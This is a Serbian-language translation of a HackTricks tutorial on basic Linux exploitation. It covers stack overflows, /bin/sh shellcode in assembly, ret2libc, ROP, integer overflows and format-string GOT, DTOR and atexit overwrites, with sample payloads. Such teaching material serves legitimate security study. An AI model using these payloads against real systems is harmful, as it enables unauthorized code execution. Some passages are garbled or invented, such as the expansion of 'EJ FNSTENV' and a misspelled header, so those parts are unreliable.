# Linux Exploiting (Osnovno) (SRB)

## Linux Exploiting (Osnovno) (SRB)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **ASLR**

Aleatorizacija adresa

**IskljuÄivanje globalne aleatorizacije (ASLR) (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Ponovno ukljuÄivanje globalne aleatorizacije: echo 2 > /proc/sys/kernel/randomize\_va\_space

**IskljuÄivanje za jedno izvrÅ¡avanje** (ne zahteva root):\
setarch \`arch\` -R ./primer argumenti\
setarch \`uname -m\` -R ./primer argumenti

**IskljuÄivanje zaÅ¡titne izvrÅ¡ne zaÅ¡tite na steku**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack primer.c -o primer

**Core fajl**\
ulimit -c unlimited\
gdb /exec core\_fajl\
/etc/security/limits.conf -> \* soft core unlimited

**Tekst**\
**Podaci**\
**BSS**\
**Heap**

**Stek**

**BSS sekcija**: Globalne ili statiÄke neinicijalizovane promenljive
```
static int i;
```
**Odeljak DATA**: Globalne ili statiÄke inicijalizovane promenljive
```
int i = 5;
```
**Odeljak TEXT**: Uputstva za kod (opkodovi)

**Odeljak HEAP**: DinamiÄki rezervisani baferi (malloc(), calloc(), realloc())

**Odeljak STACK**: Stog (prosleÄ‘eni argumenti, okruÅ¾enje niske (env), lokalne promenljive...)

## **1. STACK PREKORAÄŒENJA**

> prekoraÄenje bafera, prekoraÄenje stoga, prekoraÄenje steka, uniÅ¡tavanje steka

Segmentacija greÅ¡ke ili segmentacija krÅ¡enja: Kada se pokuÅ¡a pristupiti memorijskoj adresi koja nije dodeljena procesu.

Da biste dobili adresu funkcije unutar programa, moÅ¾ete koristiti:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Poziv na sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Pregledajte prekide kernela: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; Äistimo eax\
xor ebx, ebx ; ebx = 0 jer nema argumenata za prosleÄ‘ivanje\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; IzvrÅ¡avanje syscall-a

**nasm -f elf assembly.asm** â€”> VraÄ‡a .o datoteku\
**ld assembly.o -o shellcodeout** â€”> Daje izvrÅ¡nu datoteku sastavljenu od asemblerskog koda i moÅ¾emo izvuÄ‡i opkodove pomoÄ‡u **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> Da bismo videli da je to zaista naÅ¡a shellcode i izvukli opkode

**Proverite da li shellcode radi**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Da biste videli da li sistemski pozivi pravilno funkcioniÅ¡u, trebate da kompajlirate prethodni program i sistemski pozivi trebaju biti prikazani u **strace ./PROGRAMA\_COMPILADO**

Prilikom kreiranja shellcode-a moÅ¾e se koristiti trik. Prva instrukcija je skok na poziv. Poziv poziva originalni kod i dodaje EIP na stek. Nakon instrukcije poziva, ubacili smo string koji nam je potreban, tako da sa tim EIP-om moÅ¾emo pokazati na string i nastaviti izvrÅ¡avanje koda.

PRIMER **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**KoriÅ¡Ä‡enje Stack-a (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**

EJ FNSTENV (Execute Jump Far Not Save Environment) je tehnika koja se koristi za iskoriÅ¡Ä‡avanje ranjivosti u Linux operativnom sistemu. Ova tehnika se koristi za preuzimanje kontrole nad ciljanim sistemom.

Kada se koristi EJ FNSTENV tehnika, napadaÄ moÅ¾e da iskoristi ranjivost u ciljanom sistemu kako bi izvrÅ¡io zlonamerni kod. Ova tehnika se Äesto koristi za eskalaciju privilegija, omoguÄ‡avajuÄ‡i napadaÄu da dobije superkorisniÄke privilegije na ciljanom sistemu.

Da bi se izvrÅ¡ila EJ FNSTENV tehnika, napadaÄ mora da pronaÄ‘e ranjivost u ciljanom sistemu koja omoguÄ‡ava izvrÅ¡avanje koda. Nakon toga, napadaÄ moÅ¾e da iskoristi tu ranjivost kako bi preuzeo kontrolu nad sistemom.

VaÅ¾no je napomenuti da je EJ FNSTENV tehnika ilegalna i da se koristi samo u okviru etiÄkog hakovanja ili pentestiranja sistema uz dozvolu vlasnika sistema. Upotreba ove tehnike bez dozvole moÅ¾e imati ozbiljne pravne posledice.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Egg Hunter:**

Ovo je mali kod koji pretraÅ¾uje stranice memorije povezane sa procesom u potrazi za shellcode-om koji je tamo spremljen (traÅ¾i neki potpis koji je postavljen u shellcode-u). Korisno u sluÄajevima kada imate samo malo prostora za ubrizgavanje koda.

**Polimorfni shellkodovi**

To su Å¡ifrirani shellkodovi koji imaju mali kod koji ih deÅ¡ifruje i skoÄi na njega, koristeÄ‡i trik Call-Pop. Evo jednog primjera Å¡ifriranog Cezarovog Å¡ifriranja:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
1. **Napad na Frame Pointer (EBP)**

Koristan u situaciji kada moÅ¾emo izmeniti EBP, ali ne i EIP.

Poznato je da se prilikom izlaska iz funkcije izvrÅ¡ava sledeÄ‡i asemblerski kod:
```
movl               %ebp, %esp
popl                %ebp
ret
```
Na ovaj naÄin, moÅ¾e se promeniti EBP prilikom izlaska iz funkcije (fvuln) koja je pozvana iz druge funkcije, tako da kada funkcija koja je pozvala fvuln zavrÅ¡i, njen EIP moÅ¾e biti promenjen.

U fvuln se moÅ¾e uneti laÅ¾ni EBP koji pokazuje na mesto gde se nalazi adresa shellcode + 4 (treba dodati 4 zbog pop). Na taj naÄin, prilikom izlaska iz funkcije, vrednost &(\&Shellcode)+4 Ä‡e biti smeÅ¡tena u ESP, sa pop Ä‡e se oduzeti 4 od ESP i on Ä‡e pokazivati na adresu shellcode kada se izvrÅ¡i ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + padding + &(\&Shellcode)+4

**Off-by-One Exploit**\
Dozvoljava se samo promena najmanje znaÄajnog bajta EBP-a. MoÅ¾e se izvesti napad kao i prethodni, ali memorija koja Äuva adresu shellcode-a mora deliti prva 3 bajta sa EBP-om.

## **4. Metode povratka na Libc**

Koristan metod kada stek nije izvrÅ¡iv ili ostavlja vrlo malo prostora za modifikaciju.

ASLR uzrokuje da se funkcije uÄitavaju na razliÄite pozicije u memoriji pri svakom izvrÅ¡avanju. Stoga ovaj metod moÅ¾e biti neefikasan u tom sluÄaju. Za udaljene servere, buduÄ‡i da se program stalno izvrÅ¡ava na istoj adresi, ovaj metod moÅ¾e biti koristan.

* **cdecl (C deklaracija)** Stavlja argumente na stek i nakon izlaska iz funkcije Äisti stek
* **stdcall (standardni poziv)** Stavlja argumente na stek i funkcija koja je pozvana Äisti stek
* **fastcall** Stavlja prva dva argumenta u registre, a ostale na stek

Postavlja se adresa system instrukcije iz libc-a i prosleÄ‘uje se kao argument string "/bin/sh", obiÄno iz okoline. TakoÄ‘e se koristi adresa exit funkcije kako bi se program bez problema zavrÅ¡io kada viÅ¡e nije potrebna shell (i zapisivanje logova).

**export SHELL=/bin/sh**

Da biste pronaÅ¡li potrebne adrese, moÅ¾ete pogledati unutar **GDB-a:**\
**p system**\
**p exit**\
**rabin2 -i izvrÅ¡na_datoteka** â€”> Daje adresu svih funkcija koje program koristi pri uÄitavanju\
(Unutar starta ili nekog prekida): **x/500s $esp** â€”> TraÅ¾imo unutar ovoga string /bin/sh

Kada imamo ove adrese, **exploit** bi izgledao ovako:

"A" \* DISTANCA EBP + 4 (EBP: mogu biti 4 "A" ali bolje je ako je pravi EBP da se izbegnu segmentacijske greÅ¡ke) + Adresa **system** (prepisuje EIP) + Adresa **exit** (nakon izvrÅ¡avanja system("/bin/sh") ova funkcija Ä‡e se pozvati jer su prva 4 bajta na steku tretirana kao sledeÄ‡a adresa EIP-a koja Ä‡e se izvrÅ¡iti) + Adresa "**/bin/sh**" (biÄ‡e prosleÄ‘en parametar system-u)

Na ovaj naÄin Ä‡e se EIP prepisati adresom system koja Ä‡e primiti string "/bin/sh" kao argument, a nakon izlaska iz toga izvrÅ¡iÄ‡e se funkcija exit().

MoguÄ‡e je da se naÄ‘ete u situaciji da je neki bajt neke adrese neaktivan ili prazan (\x20). U tom sluÄaju moÅ¾ete dezasemblirati prethodne adrese do te funkcije jer Ä‡e verovatno biti nekoliko NOP-ova koji Ä‡e nam omoguÄ‡iti da pozovemo neki od njih umesto same funkcije (na primer sa > x/8i system-4).

Ovaj metod funkcioniÅ¡e jer kada se funkcija kao Å¡to je system poziva koristeÄ‡i opcode **ret** umesto **call**, funkcija shvata da Ä‡e prva 4 bajta biti adresa **EIP** na koju Ä‡e se vratiti.

Interesantna tehnika sa ovim metod je pozivanje **strncpy()** da bi se prebacio payload sa steka na hip i zatim koristio **gets()** da se izvrÅ¡i taj payload.

JoÅ¡ jedna interesantna tehnika je koriÅ¡Ä‡enje **mprotect()** koja omoguÄ‡ava dodeljivanje Å¾eljenih dozvola bilo kojem delu memorije. Radi ili je radila na BDS-u, MacOS-u i OpenBSD-u, ali ne i na Linuxu (kontroliÅ¡e da ne moÅ¾e biti dodeljeno istovremeno pisanje i izvrÅ¡avanje). PomoÄ‡u ovog napada moglo bi se ponovo konfigurisati izvrÅ¡avanje steka.

**Povezivanje funkcija**

Na osnovu prethodne tehnike, ovaj oblik exploit-a sastoji se od:\
Padding + \&Funkcija1 + \&pop;ret; + \&arg\_fun1 + \&Funkcija2 + \&pop;ret; + \&arg\_fun2 + ...

Na ovaj naÄin mogu se povezati funkcije koje Ä‡e biti pozvane. TakoÄ‘e, ako Å¾elite koristiti funkcije sa viÅ¡e argumenata, moÅ¾ete postaviti potrebne argumente (npr. 4) i postaviti 4 argumenta i pronaÄ‡i adresu sa opcodima: pop, pop, pop, pop, ret â€”> **objdump -d izvrÅ¡na_datoteka**

**Povezivanje putem laÅ¾nih okvira (povezivanje EBPa)**

Ovo se sastoji od iskoriÅ¡Ä‡avanja moguÄ‡nosti manipulacije EBP-om kako bi se povezalo izvrÅ¡avanje viÅ¡e funkcija putem EBP-a i "leave;ret"

PADDING

* Postavljamo laÅ¾ni EBP u EBP koji pokazuje na: 2. laÅ¾ni EBP + funkcija za izvrÅ¡avanje: (\&system() + \&leave;ret + &"/bin/sh")
* U EIP postavljamo adresu funkcije &(leave;ret)

PokreÄ‡emo shellcode sa adresom sledeÄ‡eg dela shellcode-a, na primer: 2. laÅ¾ni EBP + \&system() + &(leave;ret;) + &"/bin/sh"

2. laÅ¾ni EBP bi bio: 3. laÅ¾ni EBP + \&system() + &(leave;ret;) + &"/bin/ls"

Ovaj shellcode se moÅ¾e ponavljati beskonaÄno puta na delovima memorije do kojih se ima pristup, tako da se dobija shellcode koji se lako deli na male delove memorije.

(IzvrÅ¡avanje funkcija se povezuje meÅ¡anjem ranije viÄ‘enih ranjivosti EBP-a i ret2lib) 

## **5. Dodatne metode**

**Ret2Ret**

Koristan kada nije moguÄ‡e staviti adresu sa steka u EIP (proverava se da EIP ne sadrÅ¾i 0xbf) ili kada nije moguÄ‡e izraÄunati lokaciju shellcode-a. Ali, ranjiva funkcija prihvata jedan parametar (shellcode Ä‡e biti ovde).

Na ovaj naÄin, menjanjem EIP-a sa adresom **ret**, uÄitaÄ‡e se sledeÄ‡a adresa (koja je adresa prvog argumenta funkcije). Drugim reÄima, uÄitaÄ‡e se shellcode.

Exploit bi izgledao ovako: SHELLCODE + Padding (do EIP-a) + **\&ret** (sledeÄ‡i bajtovi na steku pokazuju na poÄetak shellcode-a jer se na stek stavlja adresa prosleÄ‘enog parametra)

Izgleda da funkcije poput **strncpy** nakon zavrÅ¡etka briÅ¡u sa steka adresu na kojoj je Äuvan shellcode, Å¡to onemoguÄ‡ava ovu tehniku. Drugim reÄima, adresa koju funkcija prosleÄ‘uje kao argument (ona koja Äuva shellcode) se menja u 0x00, pa kada se pozove drugi **ret**, naiÄ‘e se na 0x00 i program se prekida.
```
**Ret2PopRet**
```
Ako nemamo kontrolu nad prvom argumentu, ali imamo nad drugim ili treÄ‡im, moÅ¾emo prepisati EIP sa adresom pop-ret ili pop-pop-ret, u zavisnosti od potrebe.

**Muratova tehnika**

Na Linuxu, svi programi se mapiraju poÄevÅ¡i od 0xbfffffff.

GledajuÄ‡i kako se konstruiÅ¡e stek novog procesa na Linuxu, moÅ¾e se razviti exploit tako da program bude pokrenut u okruÅ¾enju koje ima samo jednu promenljivu - shellcode. Adresa ove promenljive se moÅ¾e izraÄunati kao: addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)

Na ovaj naÄin se lako dobija adresa gde se nalazi promenljiva okruÅ¾enja sa shellcode-om.

Ovo je moguÄ‡e zahvaljujuÄ‡i funkciji execle koja omoguÄ‡ava kreiranje okruÅ¾enja koje ima samo Å¾eljene promenljive okruÅ¾enja.

**Skok na ESP: Windows stil**

BuduÄ‡i da ESP uvek pokazuje na poÄetak steka, ova tehnika se sastoji od zamene EIP sa adresom poziva na **jmp esp** ili **call esp**. Na ovaj naÄin, shellcode se Äuva nakon prepisivanja EIP jer Ä‡e se nakon izvrÅ¡avanja **ret** ESP nalaziti na sledeÄ‡oj adresi, taÄno gde je shellcode saÄuvan.

U sluÄaju da ASLR nije aktiviran na Windowsu ili Linuxu, moÅ¾e se pozvati **jmp esp** ili **call esp** koji su smeÅ¡teni u nekom deljenom objektu. Ako je ASLR aktiviran, moÅ¾e se potraÅ¾iti unutar samog ranjivog programa.

TakoÄ‘e, Äinjenica da se shellcode moÅ¾e postaviti nakon korupcije EIP-a umesto u sredini steka omoguÄ‡ava da push ili pop instrukcije koje se izvrÅ¡avaju u sredini funkcije ne dodiruju shellcode (Å¡to bi se moglo dogoditi ako bi se postavio u sredinu steka funkcije).

Na vrlo sliÄan naÄin, ako znamo da funkcija vraÄ‡a adresu gde je shellcode saÄuvan, moÅ¾e se pozvati **call eax** ili **jmp eax (ret2eax).**

**ROP (Return Oriented Programming) ili pozajmljeni delovi koda**

Delovi koda koji se pozivaju nazivaju se gadgets.

Ova tehnika se sastoji od povezivanja razliÄitih poziva funkcija putem tehnike **ret2libc** i koriÅ¡Ä‡enja **pop,ret**.

Na nekim arhitekturama procesora, svaka instrukcija je skup od 32 bita (npr. MIPS). MeÄ‘utim, na Intelu su instrukcije promenljive veliÄine i viÅ¡e instrukcija moÅ¾e deliti skup bitova, na primer:

**movl $0xe4ff, -0x(%ebp)** â€”> SadrÅ¾i bajtove 0xffe4 koji se takoÄ‘e prevode kao: **jmp \*%esp**

Na ovaj naÄin se mogu izvrÅ¡iti neke instrukcije koje Äak nisu ni u originalnom programu.

**ROPgadget.py** nam pomaÅ¾e da pronaÄ‘emo vrednosti u binarnim fajlovima.

Ovaj program takoÄ‘e sluÅ¾i za kreiranje **payload-a**. MoÅ¾ete mu dati biblioteku iz koje Å¾elite izvuÄ‡i ROP-ove i on Ä‡e generisati payload u Pythonu, gde mu samo dajete adresu na kojoj se ta biblioteka nalazi i payload je spreman za upotrebu kao shellcode. Osim toga, poÅ¡to koristi sistemski pozive, ne izvrÅ¡ava niÅ¡ta stvarno na steku, veÄ‡ samo Äuva adrese ROP-ova koje Ä‡e se izvrÅ¡iti putem **ret** instrukcije. Da biste koristili ovaj payload, morate pozvati payload putem **ret** instrukcije.

**PrekoraÄenje celobrojnih vrednosti**

Ova vrsta prekoraÄenja se javlja kada promenljiva nije spremna da podrÅ¾i tako veliki broj koji joj se prosleÄ‘uje, moÅ¾da zbog zabune izmeÄ‘u promenljivih sa i bez znaka, na primer:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
U prethodnom primeru vidimo da program oÄekuje 2 parametra. Prvi je duÅ¾ina sledeÄ‡eg niza, a drugi je niz.

Ako prosledimo negativan broj kao prvi parametar, dobiÄ‡emo da je len < 256 i proÄ‡i Ä‡emo taj filter, a takoÄ‘e Ä‡e strlen(buffer) biti manji od l, jer je l unsigned int i biÄ‡e veoma velik.

Ova vrsta prekoraÄenja ne pokuÅ¡ava da neÅ¡to napiÅ¡e u procesu programa, veÄ‡ da prevaziÄ‘e loÅ¡e dizajnirane filtere kako bi iskoristila druge ranjivosti.

**NepoÄetne promenljive**

Nije poznata vrednost koju moÅ¾e imati nepoÄetna promenljiva i moÅ¾e biti interesantno posmatrati je. MoÅ¾e se desiti da uzme vrednost koju je uzela promenljiva iz prethodne funkcije i da je kontrolira napadaÄ.

## **Formatiranje stringova**

U C-u, **`printf`** je funkcija koja se moÅ¾e koristiti za **ispisivanje** nekog stringa. **Prvi parametar** koji ova funkcija oÄekuje je **sirovi tekst sa formatiranjem**. **SledeÄ‡i parametri** koji se oÄekuju su **vrednosti** koje Ä‡e **zameniti formatere** iz sirovog teksta.

Ranjivost se javlja kada **napadaÄev tekst bude postavljen kao prvi argument** ovoj funkciji. NapadaÄ Ä‡e moÄ‡i da kreira **poseban unos zloupotrebom moguÄ‡nosti formatiranja printf-a** kako bi **upisao bilo koje podatke na bilo koju adresu**. Na taj naÄin Ä‡e biti u moguÄ‡nosti da **izvrÅ¡i proizvoljni kod**.

Formati:
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**`%n`** **upisuje** **broj upisanih bajtova** na **naznaÄenoj adresi. Upisivanje** toliko **bajtova** koliko je heksadecimalni broj koji **Å¾elimo** da upiÅ¡emo je naÄin da **upiÅ¡emo bilo koje podatke**.
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
### GOT (Globalna tabela ofseta) / PLT (Tabela vezivanja postupaka)

Ovo je tabela koja sadrÅ¾i **adresu** **spoljnih funkcija** koje koristi program.

Dobijte adresu ove tabele sa: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Primetite kako nakon **uÄitavanja** izvrÅ¡nog fajla u GEF-u moÅ¾ete **videti** funkcije koje se nalaze u GOT-u: `gefâ¤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

KoristeÄ‡i GEF, moÅ¾ete **pokrenuti** sesiju **debugovanja** i izvrÅ¡iti **`got`** da biste videli got tabelu:

![](<../../.gitbook/assets/image (621).png>)

U binarnom fajlu GOT ima **adrese funkcija ili** odeljak **PLT** koji Ä‡e uÄitati adresu funkcije. Cilj ovog napada je **zamena unosa u GOT-u** funkcije koja Ä‡e biti izvrÅ¡ena kasnije **sa** adresom PLT-a **`system`** **funkcije**. Idealno, zamena Ä‡e se desiti u GOT-u funkcije koja Ä‡e biti **pozvana sa parametrima koje kontroliÅ¡ete** (tako da Ä‡ete moÄ‡i da kontroliÅ¡ete parametre poslate funkciji system).

Ako **`system`** **nije koriÅ¡Ä‡en** u skripti, funkcija system **neÄ‡e** imati unos u GOT-u. U ovom scenariju, **prvo Ä‡ete morati da otkrijete adresu** funkcije `system`.

**Tabela vezivanja postupaka** je **samo za Äitanje** tabela u ELF fajlu koja Äuva sve neophodne **simbole koji zahtevaju razreÅ¡enje**. Kada se pozove jedna od ovih funkcija, **GOT** Ä‡e **preusmeriti** **tok** na **PLT** kako bi mogao da **razreÅ¡i** **adresu** funkcije i upiÅ¡e je u GOT.\
Zatim, **sledeÄ‡i put** kada se pozove ta adresa, **funkcija** se **poziva direktno** bez potrebe za razreÅ¡enjem.

MoÅ¾ete videti adrese PLT-a sa **`objdump -j .plt -d ./vuln_binary`**

### **Tok napada**

Kao Å¡to je objaÅ¡njeno ranije, cilj Ä‡e biti **zamena adrese** funkcije u GOT tabeli koja Ä‡e biti pozvana kasnije. Idealno bi bilo postaviti **adresu na shell kod** koji se nalazi u izvrÅ¡nom odeljku, ali je vrlo verovatno da neÄ‡ete moÄ‡i da napiÅ¡ete shell kod u izvrÅ¡nom odeljku.\
Zato je druga opcija da **zamenite funkciju** koja **prima** svoje **argumente** od **korisnika** i **usmerite** je na **`system`** **funkciju**.

Da biste napisali adresu, obiÄno se koriste 2 koraka: Prvo **piÅ¡ete 2 bajta** adrese, a zatim druga 2. Za to se koristi **`$hn`**.

**HOB** se odnosi na 2 viÅ¡a bajta adrese\
**LOB** se odnosi na 2 niÅ¾a bajta adrese

Dakle, zbog toga kako format string radi, prvo morate **napisati manji** od \[HOB, LOB] i zatim drugi.

Ako je HOB < LOB\
`[adresa+2][adresa]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Ako je HOB > LOB\
`[adresa+2][adresa]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Å ablon za napad format stringom**

MoÅ¾ete pronaÄ‡i **Å¡ablon** za napad na GOT koriÅ¡Ä‡enjem format stringova ovde:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Essentially this is a structure with **functions that will be called** before the program finishes. This is interesting if you can call your **shellcode just jumping to an address**, or in cases where you need to go back to main again to **exploit the format string a second time**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Napomena da ovo **neÄ‡e** **stvoriti** beskonaÄnu petlju jer kada se vratite na glavnu funkciju, kanarinci Ä‡e primetiti da je kraj steka moÅ¾da oÅ¡teÄ‡en i funkcija se neÄ‡e ponovo pozivati. Dakle, sa ovim Ä‡ete moÄ‡i da **izvrÅ¡ite joÅ¡ jedan** napad na ranjivost.

### **Formatiranje stringova za ispis sadrÅ¾aja**

Formatiranje stringova takoÄ‘e se moÅ¾e zloupotrebiti za **ispisivanje sadrÅ¾aja** iz memorije programa.\
Na primer, u sledeÄ‡oj situaciji postoji **lokalna promenljiva na steku koja pokazuje na zastavicu**. Ako **pronaÄ‘ete** gde se u **memoriji** nalazi **pokazivaÄ** na **zastavicu**, moÅ¾ete naterati **printf da pristupi** toj **adresi** i **ispise** zastavicu:

Dakle, zastavica je na **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Iz curenja moÅ¾ete videti da je **pokazivaÄ na zastavicu** u **osmom** parametru:

![](<../../.gitbook/assets/image (623).png>)

Dakle, **pristupanjem** **osmom parametru** moÅ¾ete dobiti zastavicu:

![](<../../.gitbook/assets/image (624).png>)

Napomena da nakon **prethodnog napada** i shvatanja da moÅ¾ete **procureti sadrÅ¾aj**, moÅ¾ete **postaviti pokazivaÄe** na **`printf`** na sekciju gde je **uÄitana** izvrÅ¡na datoteka i **potpuno je iscuriti**!

### **DTOR**

{% hint style="danger" %}
Danas je vrlo **Äudno pronaÄ‡i binarnu datoteku sa sekcijom dtor**.
{% endhint %}

Destruktori su funkcije koje se **izvrÅ¡avaju pre zavrÅ¡etka programa**.\
Ako uspete da **upiÅ¡ete adresu** Å¡el koda u **`__DTOR_END__`**, to Ä‡e se **izvrÅ¡iti** pre nego Å¡to program zavrÅ¡i.\
Dobijte adresu ove sekcije sa:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep â€œ__DTORâ€
```
ObiÄno Ä‡ete pronaÄ‡i **DTOR** sekciju **izmeÄ‘u** vrednosti `ffffffff` i `00000000`. Dakle, ako vidite samo te vrednosti, to znaÄi da **nema registrovane funkcije**. Dakle, **prepiÅ¡ite** **`00000000`** sa **adresom** do **shell koda** kako biste ga izvrÅ¡ili.

### **Formatiranje stringova za preplavljivanje bafera**

**sprintf** funkcija kopira formatirani string u promenljivu. Stoga, moÅ¾ete iskoristiti formatiranje stringa da izazovete preplavljivanje bafera u promenljivoj gde se kopira sadrÅ¾aj. Na primer, payload `%.44xAAAA` Ä‡e **upisati 44B+"AAAA" u promenljivu**, Å¡to moÅ¾e izazvati preplavljivanje bafera.

### **\_\_atexit strukture**

{% hint style="danger" %}
Danas je vrlo **neobiÄno iskoristiti ovo**.
{% endhint %}

**`atexit()`** je funkcija kojoj se **drugaÄije funkcije prosleÄ‘uju kao parametri**. Ove **funkcije** Ä‡e biti **izvrÅ¡ene** prilikom izvrÅ¡avanja **`exit()`** ili **povratka** iz **main** funkcije.\
Ako moÅ¾ete **izmeniti adresu** bilo koje od ovih **funkcija** da pokazuje na shell kod na primer, dobiÄ‡ete kontrolu nad procesom, ali to je trenutno komplikovanije.\
Trenutno su **adrese funkcija** koje treba izvrÅ¡iti **sakrivene** iza nekoliko struktura i na kraju adresa na koju pokazuju nije adresa funkcija, veÄ‡ su **Å¡ifrovane sa XOR** i pomerene sa **sluÄajnim kljuÄem**. Tako da je trenutno ovaj vektor napada **nije vrlo koristan, barem na x86** i **x64\_86**.\
**Funkcija za Å¡ifrovanje** je **`PTR_MANGLE`**. **Druge arhitekture** kao Å¡to su m68k, mips32, mips64, aarch64, arm, hppa... **ne implementiraju funkciju za Å¡ifrovanje** jer **vraÄ‡aju isto** Å¡to su primile kao ulaz. Dakle, ove arhitekture bi bile podloÅ¾ne ovom vektoru napada.

### **setjmp() & longjmp()**

